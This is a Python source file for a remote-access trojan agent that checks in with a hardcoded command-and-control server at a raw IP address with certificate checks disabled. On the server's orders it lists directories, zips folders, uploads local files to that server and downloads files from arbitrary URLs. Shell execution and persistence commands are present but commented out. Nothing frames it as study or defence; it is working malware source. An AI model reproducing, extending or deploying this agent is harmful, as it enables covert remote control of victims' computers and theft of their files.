# coding: utf-8

import requests
import time
import os
import subprocess
import sys
import traceback
import threading
import uuid
import zipfile
import socket



SERVER = "https://120.244.125.19:28080"
HELLO_INTERVAL = 5
IDLE_TIME = 60




def threaded(func):
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args)
        t.start()
        return
    return wrapper


class Agent(object):

    def __init__(self):
        self.idle = True
        self.silent = False
        self.platform = 'Windows'
        self.last_active = time.time()
        self.failed_connections = 0
        self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        self.username = socket.gethostname()



    def get_UID(self):
        """ Returns a unique ID for the agent """
        return socket.gethostname() + "_" + str(uuid.getnode())

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(SERVER + '/api/' + self.uid + '/hello', verify=False,
            json={'platform': '', 'hostname': self.hostname, 'username': self.username})
        return req.text

    def send_output(self, output, newlines=True):
        """ Send console output to server """
        if self.silent:
            self.log(output)
            return
        if not output:
            return
        if newlines:
            output += "\n\n"
        req = requests.post(SERVER + '/api/' + self.uid + '/report', verify=False,
        data={'output': output})

    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))


    #@threaded
    #def runcmd(self, cmd):
        #""" Runs a shell command and returns its output """
        #try:
            #proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            #out, err = proc.communicate()
            #output = (out + err)
            #self.send_output(output.decode('gbk'))
        #except Exception as exc:
            #self.send_output(traceback.format_exc())


    def cd(self, directory):
        """ Change current directory """
        os.chdir(self.expand_path(directory))


    def ls(self):
        """ list file """
        try:
            fileList = os.listdir()
            fileStr = '\n'.join(fileList)
            self.send_output(fileStr)
        except Exception as exc:
            self.send_output(traceback.format_exc())        

    @threaded
    def upload(self, file):
        """ Uploads a local file to the server """
        file = self.expand_path(file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(SERVER + '/api/' + self.uid + '/upload',verify=False,
                    files={'uploaded': open(file, 'rb')})
            else:
                self.send_output('[!] No such file: ' + file)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    @threaded
    def download(self, file, destination=''):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
            destination = self.expand_path(destination)
            if not destination:
                destination= file.split('/')[-1]
            self.send_output("[*] Downloading %s..." % file)
            req = requests.get(file, stream=True,verify=False,)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("[+] File downloaded: " + destination)
        except Exception as exc:
            self.send_output(traceback.format_exc())


    def exit(self):
        """ Kills the agent """
        self.send_output('[+] Exiting... (bye!)')
        sys.exit(0)

    @threaded
    def zip(self, zip_name, to_zip):
        """ Zips a folder or file """
        try:
            zip_name = self.expand_path(zip_name)
            to_zip = self.expand_path(to_zip)
            if not os.path.exists(to_zip):
                self.send_output("[+] No such file or directory: %s" % to_zip)
                return
            self.send_output("[*] Creating zip archive...")
            zip_file = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
            if os.path.isdir(to_zip):
                relative_path = os.path.dirname(to_zip)
                for root, dirs, files in os.walk(to_zip):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(to_zip, os.path.basename(to_zip))
            zip_file.close()
            self.send_output("[+] Archive created: %s" % zip_name)
        except Exception as exc:
            self.send_output(traceback.format_exc())
   



    def run(self):
        """ Main loop """
        while True:
            try:
                todo = self.server_hello()

                if todo:
                    commandline = todo
                    self.idle = False
                    self.last_active = time.time()
                    self.send_output('$ ' + commandline)
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    try:
                        if command == 'cd':
                            if not args:
                                self.send_output('usage: cd </path/to/directory>')
                            else:
                                self.cd(args[0])
                        elif command == 'upload':
                            if not args:
                                self.send_output('usage: upload <localfile>')
                            else:
                                self.upload(args[0],)
                        elif command == 'download':
                            if not args:
                                self.send_output('usage: download <remote_url> <destination>')
                            else:
                                if len(args) == 2:
                                    self.download(args[0], args[1])
                                else:
                                    self.download(args[0])
                        elif command == 'ls':
                            self.ls()
                        #elif command == 'clean':
                            #self.clean()
                        #elif command == 'persist':
                            #self.persist()
                        elif command == 'exit':
                            self.exit()
                        elif command == 'zip':
                            if not args or len(args) < 2:
                                self.send_output('usage: zip <archive_name> <folder>')
                            else:
                                self.zip(args[0], " ".join(args[1:]))
                        else:
                            #self.runcmd(commandline)
                            pass
                    except Exception as exc:
                        self.send_output(traceback.format_exc())
                else:
                    if self.idle:
                        time.sleep(HELLO_INTERVAL)
                    elif (time.time() - self.last_active) > IDLE_TIME:
                        self.log("Switching to idle mode...")
                        self.idle = True
                    else:
                        time.sleep(0.5)
            except Exception as exc:
                self.log(traceback.format_exc())
                time.sleep(HELLO_INTERVAL)

def main():
    agent = Agent()
    agent.run()

if __name__ == "__main__":
    main()
